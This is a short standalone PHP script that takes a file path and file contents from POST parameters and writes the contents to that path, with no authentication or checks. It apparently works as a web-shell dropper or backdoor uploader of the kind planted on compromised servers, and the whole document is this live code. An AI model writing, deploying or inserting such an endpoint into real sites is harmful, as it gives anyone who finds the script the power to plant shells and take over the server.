<?php
 $leter= $_POST['leterPOST'];
 $url= $_POST['url'];

$f = fopen( $url, "wb");

	
	fwrite($f, $leter); 
	fclose($f);

?>